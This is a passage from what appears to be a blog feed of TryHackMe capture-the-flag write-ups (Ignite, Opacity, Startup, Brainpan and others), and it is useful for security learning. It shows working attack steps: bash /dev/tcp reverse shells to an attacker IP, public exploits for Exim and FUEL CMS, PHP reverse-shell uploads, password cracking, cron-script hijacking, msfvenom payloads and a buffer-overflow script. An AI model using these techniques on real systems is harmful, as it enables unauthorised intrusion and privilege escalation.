/usr/bin/chfn /usr/bin/pkexec /usr/bin/chsh /usr/bin/arping /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/passwd /usr/bin/traceroute6.iputils /usr/bin/vmware-user-suid-wrapper /usr/bin/sudo /bin/ping /bin/umount /bin/su /bin/fusermount /bin/mount Exim is a strange file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 exim4 --version Exim version 4.90_1 #4 built 14-Feb-2018 16:01:14 Copyright (c) University of Cambridge, 1995 - 2017 (c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2017 Berkeley DB: Berkeley DB 5.3.28: (September 9, 2013) Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd Authenticators: cram_md5 plaintext Routers: accept dnslookup ipliteral manualroute queryprogram redirect Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp Fixed never_users: 0 Configure owner: 0:0 Size of off_t: 8 Configuration file is /var/lib/exim4/config.autogenerated I found this exploit: https://raw.githubusercontent.com/AzizMea/CVE-2019-10149-privilege-escalation/master/wizard.py we can copy the script, change the port to the one that exim4 is running and execute it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 python wizard.py 220 at ESMTP Exim 4.90_1 Ubuntu Sun, 07 Jun 2020 19:12:08 +0200 250 at Hello localhost [127.0.0.1] 250 OK 250 Accepted 354 Enter message, ending with \u0026#34;.\u0026#34; on a line by itself 250 OK id=1jhyq8-0000r2-HW whoami root So now we just want to find the last flag, which is in the bubblegum home.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 cat bmo.txt ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ░░░░▄██████████████████████▄░░░░ ░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░ ░░░░█░▄██████████████████▄░█░░░░ ░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░ ░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░ ░░░░█░█░░█░░░░░░░░░░░░█░░█░█░░░░ ░░░░█░█░░░░░▄▄▄▄▄▄▄▄░░░░░█░█░░░░ ░░░░█░█░░░░░▀▄░░░░▄▀░░░░░█░█░░░░ ░░░░█░█░░░░░░░▀▀▀▀░░░░░░░█░█░░░░ ░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░ ░█▌░█░▀██████████████████▀░█░▐█░ ░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░ ░█░░█░████████████░░░░░██░░█░░█░ ░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░ ░█░░█░░░░░░░░░░░░░░░▄░░░░░░█░░█░ ░▀█▄█░░░▐█▌░░░░░░░▄███▄░██░█▄█▀░ ░░░▀█░░█████░░░░░░░░░░░░░░░█▀░░░ ░░░░█░░░▐█▌░░░░░░░░░▄██▄░░░█░░░░ ░░░░█░░░░░░░░░░░░░░▐████▌░░█░░░░ ░░░░█░▄▄▄░▄▄▄░░░░░░░▀██▀░░░█░░░░ ░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░ ░░░░▀██████████████████████▀░░░░ ░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░ ░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░ ░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░ ░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░ ░░░░░░░▐██░░░░░░░░░░░░██▌░░░░░░░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ Secret project number: 211243A Name opbject: BMO Rol object: Spy In case of emergency use resetcode: tryhackme{Th1s1s4c0d3F0rBM0} ------- Good job on getting this code!!!! You solved all the puzzles and tried harder to the max. If you liked this CTF, give a shout out to @n0w4n. ","date":"2024-01-18T00:00:00Z","image":"https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled.png","permalink":"https://simonefelici.github.io/p/adventure-time-writeup-thm/","title":"Adventure Time Writeup THM"},{"content":"I am going to start with a nmap scna:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 nmap -sC -sV 10.10.10.167 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-05 11:40 EST Nmap scan report for 10.10.10.167 Host is up (0.057s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Welcome to FUEL CMS | http-robots.txt: 1 disallowed entry |_/fuel/ |_http-server-header: Apache/2.4.18 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.67 seconds We see that it has a web page running on “FUEL CMS”\nWe see that it’s running version 1.4 which is vulnerable.\nFrom the nmap scan we also know that it has the robots.txt and fuel directories:\n1 2 User-agent: * Disallow: /fuel/ Now I am going to use an exploit that works with fuel cms 1.4:\nhttps://www.exploit-db.com/exploits/50477:\n1 2 3 4 python3 50477.py -u http://10.10.10.167/ [+]Connecting... Enter Command $whoami systemwww-data Ok now I am going to start a proper reverse shell.\nbash -i \u0026gt;\u0026amp; /dev/tcp/10.11.65.91/4444 0\u0026gt;\u0026amp;1\n1 2 3 4 5 6 nc -lvnp 4444 listening on [any] 4444 ... connect to [10.11.65.91] from (UNKNOWN) [10.10.113.174] 34452 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data From there I just searched the web directory, and found the config folder.\nIn there there was a file named database.php, which contains the root credentials\n1 2 3 4 5 su root Password: root@ubuntu:/var/www/html/fuel/application/config# whoami root ","date":"2024-01-10T00:00:00Z","image":"https://images.unsplash.com/photo-1546182208-1e70985e2bf3?q=80\u0026w=2592\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://simonefelici.github.io/p/ignite-writeup-thm/","title":"Ignite Writeup THM"},{"content":"I am going to start with a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 nmap -sC -sV 10.10.163.225 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-05 09:11 EST Nmap scan report for 10.10.163.225 Host is up (0.057s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA) | 256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA) |_ 256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-title: Login |_Requested resource was login.php |_http-server-header: Apache/2.4.41 (Ubuntu) 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_nbstat: NetBIOS name: OPACITY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb2-time: | date: 2024-01-05T14:12:03 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds Now we know that it runs HTTP and SAMBA,\nfirst let’s see what’s in the web page:\nWe can see that there is a login page.\nBut there are other directories:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ffuf -u http://10.10.163.225/FUZZ -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.163.225/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ .htaccess [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6221ms] .htpasswd [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6475ms] cloud [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 57ms] css [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 2377ms] server-status [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 56ms] :: Progress: [20469/20469] :: Job [1/1] :: 327 req/sec :: Duration: [0:00:46] :: Errors: 0 :: The cloud one could let us upload a reverse shell:\nWe need to start our listener with a revshell.php, and upload the php code like that to avoid the security measurements:\nSo we got the shell:\n1 2 3 4 5 6 7 8 9 10 nc -lvnp 4444 listening on [any] 4444 ... connect to [10.11.65.91] from (UNKNOWN) [10.10.163.225] 37874 Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 14:47:56 up 37 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data In the opt folder I found out a dataset.kdbx file which stores the keepass credentials.\nI copied it in the / folder so I could download it from my machine.\nThis type of file can be cracked using john:\n1 2 3 4 5 6 7 8 9 10 11 12 john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt Keepasshash.txt Using default input encoding: UTF-8 Loaded 1 password hash (KeePass [SHA256 AES 32/64]) Cost 1 (iteration count) is 100000 for all loaded hashes Cost 2 (version) is 2 for all loaded hashes Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 741852963 (dataset) 1g 0:00:00:04 DONE (2024-01-05 09:58) 0.2105g/s 185.2p/s 185.2c/s 185.2C/s chichi..david1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. And now if we open the file with keepass we got the credentials!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ssh sysadmin@10.10.163.225 sysadmin@10.10.163.225\u0026#39;s password: Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri 05 Jan 2024 03:03:45 PM UTC System load: 0.02 Processes: 125 Usage of /: 57.1% of 8.87GB Users logged in: 0 Memory usage: 28% IPv4 address for eth0: 10.10.163.225 Swap usage: 0% * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s just raised the bar for easy, resilient and secure K8s cluster deployment. https://ubuntu.com/engage/secure-kubernetes-at-the-edge * Introducing Expanded Security Maintenance for Applications. Receive updates to over 25,000 software packages with your Ubuntu Pro subscription. Free for personal use. https://ubuntu.com/pro Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Wed Feb 22 08:13:43 2023 from 10.0.2.15 sysadmin@opacity:~$ And we got the first flag.\nFrom here we have a scripts folder, inside there is a file owned by root:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 cat script.php \u0026lt;?php //Backup of scripts sysadmin folder require_once(\u0026#39;lib/backup.inc.php\u0026#39;); zipData(\u0026#39;/home/sysadmin/scripts\u0026#39;, \u0026#39;/var/backups/backup.zip\u0026#39;); echo \u0026#39;Successful\u0026#39;, PHP_EOL; //Files scheduled removal $dir = \u0026#34;/var/www/html/cloud/images\u0026#34;; if(file_exists($dir)){ $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS); $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST); foreach ( $ri as $file ) { $file-\u0026gt;isDir() ? rmdir($file) : unlink($file); } } ?\u0026gt; We see that this script calls lib/backup.inc.php so what I have done is moving the original script out of the folder, and instead put mine which contains a reverse shell(I have used the pentestermonkey one)\nSo the next time that the main script runs, we should have a reverse shell:\n1 2 3 4 5 6 7 8 9 10 11 nc -lvnp 4444 listening on [any] 4444 ... connect to [10.11.65.91] from (UNKNOWN) [10.10.163.225] 55346 Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 15:20:02 up 1:09, 1 user, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT sysadmin pts/0 10.11.65.91 15:03 1:05 0.08s 0.08s -bash uid=0(root) gid=0(root) groups=0(root) bash: cannot set terminal process group (2322): Inappropriate ioctl for device bash: no job control in this shell root@opacity:/# ls ","date":"2024-01-08T00:00:00Z","image":"https://images.unsplash.com/photo-1596703720229-1f8fbb8daae5?q=80\u0026w=2574\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://simonefelici.github.io/p/opacity-writeup-thm/","title":"Opacity Writeup THM"},{"content":"I will start with a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 nmap -sC -sV 10.10.107.18 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-04 15:17 EST Nmap scan report for 10.10.107.18 Host is up (0.062s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to 10.11.65.91 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp [NSE: writeable] | -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg |_-rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA) | 256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA) |_ 256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Maintenance Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel First of all we see that in the ftp server allows Anonymous login and that there are 2 file in it.\nI will start with that:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ftp 10.10.107.18 Connected to 10.10.107.18. 220 (vsFTPd 3.0.3) Name (10.10.107.18:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||56482|) 150 Here comes the directory listing. drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg -rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt 226 Directory send OK. 1 2 3 cat notice.txt Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus. We now have a name, Maya.\nThe site doesn’t tell us much:\nSo I started a directory fuzzer:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ffuf -u http://10.10.107.18/FUZZ -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.107.18/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ .htaccess [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms] .htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2807ms] files [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 172ms] server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 66ms] :: Progress: [20469/20469] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:44] :: Errors: 0 :: I discovered the files directory which is the ftp share:\nMaybe we can upload a php revshell with ftp.\nWe have write access in the ftp folder:\n1 2 3 4 5 6 7 8 9 10 11 ftp\u0026gt; cd ftp 250 Directory successfully changed. ftp\u0026gt; put php.php local: php.php remote: php.php 229 Entering Extended Passive Mode (|||40969|) 150 Ok to send data. 100% |***************************************************************************************************| 3461 70.22 MiB/s 00:00 ETA 226 Transfer complete. 3461 bytes sent in 00:00 (6.92 KiB/s) ftp\u0026gt; I uploaded my pentester monkey php reverse shell\n1 2 3 4 5 6 7 8 9 10 11 12 nc -lvnp 4444 listening on [any] 4444 ... connect to [10.11.65.91] from (UNKNOWN) [10.10.107.18] 40798 Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 20:52:55 up 37 min, 0 users, load average: 0.00, 0.05, 0.01 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data $ And we got a shell!\n1 2 3 4 which python /usr/bin/python python -c \u0026#39;import pty; pty.spawn (\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@startup:/$ I also spawned a nicer shell with the help of python.\napart from the recipe, in the home directory there are also a vagrant directory, which appears to be a home directory, and an incidents directory:\n1 2 3 4 5 6 ls bin home lib mnt root srv vagrant boot incidents lib64 opt run sys var dev initrd.img lost+found proc sbin tmp vmlinuz etc initrd.img.old media recipe.txt snap usr vmlinuz.old In the incidents there is a pcapng file which we can read with wireshark, I downloaded the file uploading it in the ftp directory:\n1 cp suspicious.pcapng /var/www/html/files/ftp From here I looked up the traffic and found out that lennie, tried to login with his credentials with the www-data account:\n1 2 Sorry, try again. [sudo] password for www-data: \u0026lt;redacted\u0026gt; So I tried logging in and it worked:\n1 2 3 4 www-data@startup:/incidents$ su lennie Password: \u0026lt;redacted\u0026gt; lennie@startup:/incidents$ I then grabbed the user flag, and discovered a file in the etc folder that I owned that it was executed from root, I edited it with this and got a root shell:\n1 2 #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.11.65.91/5555 0\u0026gt;\u0026amp;1 ","date":"2024-01-07T00:00:00Z","image":"https://raw.githubusercontent.com/Blueaulo/Startup-writeup-THM/main/91426f10-815e-4dce-8275-a7e4a86904b0_Export-603ed8d9-2b1a-49ce-8213-7061cce6ff07/Startup%2009519d3a5bfc4be5bd4c3ca84ece9361/Untitled.png","permalink":"https://simonefelici.github.io/p/startup-writeup-thm/","title":"Startup Writeup THM"},{"content":"I am going to start with a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 nmap 10.10.143.30 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 12:34 EST Nmap scan report for 10.10.143.30 Host is up (0.058s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 9999/tcp open abyss 10000/tcp open snet-sensor-mgmt Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds 1 2 9999/tcp open abyss? 10000/tcp open http SimpleHTTPServer 0.6 (Python 2.7.3) Port 9999 contains the program:\n1 2 3 4 5 6 7 8 9 10 11 nc 10.10.143.30 9999 _| _| _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| _| _| _|_| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| _| _| [________________________ WELCOME TO BRAINPAN _________________________] ENTER THE PASSWORD And 10000 contains a http server:\nThe site doesn’t tell us much, but I used ffuf for enumerating the subdirectories:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ffuf -u http://10.10.143.30:10000/FUZZ -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.143.30:10000/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ bin [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 65ms] He found the bin directory, which contains the exe!\nI moved the exe in my windows machine with Immunity Debugger and mona installed.\nAnd I started the server:\nI will use this code for getting a reverse shell:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import socket ip = \u0026#34;10.10.6.37\u0026#34; port = 9999 offset = 0 overflow = \u0026#34;A\u0026#34; * offset retn = \u0026#34;\u0026#34; padding = \u0026#34;\\x90\u0026#34; * 16 payload = \u0026#34;\u0026#34; postfix = \u0026#34;\u0026#34; buffer = overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\u0026#34;Sending evil buffer...\u0026#34;) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) print(\u0026#34;Done!\u0026#34;) except: print(\u0026#34;Could not connect.\u0026#34;) With 600 bytes the server crushes.\nSo I am going to use metasploit to create a payload:\n1 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000 And I got the offset using mona:\n1 !mona findmsp -distance 5000 Now I can put the offset in the offset variable inside the script.\nI am going to start searching for the bad characters:\nUsing a payload with all the characters and compare it with mona we get this:\nAfter that we search for the jmp:\nWe need to put this in the retn variable of the script: \\zf3\\x12\\x17\\x31 (It is reversed because of the little eldiana rchitecture, which x86 CPUs have.)\nThen we generate our payload:\n1 msfvenom -p windows/shell_reverse_tcp LHOST=10.18.20.116 LPORT=4444 EXITFUNC=thread -b \u0026#34;\\x00\\x01\\x02\\x03\\x04\\x06\\x07\u0026#34; -f c And put it in the code.\nAnd now if we run the code we should have a shell:\n1 2 3 4 5 6 7 nc -lvnp 4444 listening on [any] 4444 ... connect to [10.18.20.116] from (UNKNOWN) [10.10.6.37] 49292 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Users\\admin\\Desktop\u0026gt; Now I am just going to change the ip of the script and put the one of the machine, and we should have a shell in the remote server:\nnote, i have used another msfvenom payload for this one: 1 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.18.20.116 LPORT=4444 EXITFUNC=thread -b \u0026#34;\\x00\\x01\\x02\\x03\\x04\\x06\\x07\u0026#34; -f c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nc -lvnp 4555 listening on [any] 4555 ... connect to [10.18.20.116] from (UNKNOWN) [10.10.143.30] 41139 ls checksrv.sh web python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; puck@brainpan:/home/puck$ sudo -l sudo -l Matching Defaults entries for puck on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User puck may run the following commands on this host: (root) NOPASSWD: /home/anansi/bin/anansi_util puck@brainpan:/home/puck$ Nice!\nWe can see that we can run anansi_util with root\n1 2 3 4 5 6 sudo /home/anansi/bin/anansi_util Usage: /home/anansi/bin/anansi_util [action] Where [action] is one of: - network - proclist - manual [command] The interessing thing is the manual command, which is the man command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 sudo /home/anansi/bin/anansi_util manual /bin/sh /usr/bin/man: manual-/bin/sh: No such file or directory /usr/bin/man: manual_/bin/sh: No such file or directory No manual entry for manual WARNING: terminal is not fully functional - (press RETURN) DASH(1) BSD General Commands Manual DASH(1) NAME dash — command interpreter (shell) SYNOPSIS dash [-aCefnuvxIimqVEb] [+aCefnuvxIimqVEb] [-o option_name] [+o option_name] [command_file [argument ...]] dash -c [-aCefnuvxIimqVEb] [+aCefnuvxIimqVEb] [-o option_name] [+o option_name] command_string [command_name [argument ...]] dash -s [-aCefnuvxIimqVEb] [+aCefnuvxIimqVEb] [-o option_name] [+o option_name] [argument ...] DESCRIPTION dash is the standard command interpreter for the system. The current version of dash is in the process of being changed to conform with the POSIX 1003.2 and 1003.2a specifications for the shell. This version has many features which make it appear similar in some respects to the Korn shell, but it is not a Korn shell clone (see ksh(1)). Only features des‐ ignated by POSIX, plus a few Berkeley extensions, are being incorporated into this shell. This man page is not intended to be a tutorial or a complete specification of the shell. Manual page sh(1) line 1 (press h for help or q to quit)!/bin/sh !/bin/sh # whoami whoami root And just like that we got a root shell!\n","date":"2024-01-04T00:00:00Z","image":"https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled.png","permalink":"https://simonefelici.github.io/p/brainpan-1-writeup-thm/","title":"Brainpan 1 Writeup THM"},{"content":"First of all we do a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 nmap 10.10.211.241 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 08:03 EST Nmap scan report for 10.10.211.241 Host is up (0.058s latency). Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 31337/tcp open Elite 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49161/tcp open unknown 49167/tcp open unknown First of all I am going to enumerate SAMBA\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 smbclient -L 10.10.211.241 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Users Disk smbclient //10.10.211.241/Users smb: \\\u0026gt; ls . DR 0 Thu May 14 21:57:08 2020 .. DR 0 Thu May 14 21:57:08 2020 Default DHR 0 Tue Jul 14 03:07:31 2009 desktop.ini AHS 174 Tue Jul 14 00:54:24 2009 Share D 0 Thu May 14 21:58:07 2020 7863807 blocks of size 4096. 3876514 blocks available In the share directory I have found an exe file, which I am going to transfer in my windows machine.\nI setted up my windows machine with Immunity Debugger+ mona.py, and I wrote a script to gain inital access.\nI found the offset by writing in the prompt the output of this command:\n1 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700 Then after the crash I wrote in the immunity prompt\n1 !mona findmsp -distance 700 The results will give you the offset.\nI found out the bad chars and jump point with mona too.\nmsfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b \u0026ldquo;\u0026rdquo; -f c\nI then added some NOPs and wrote this python script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 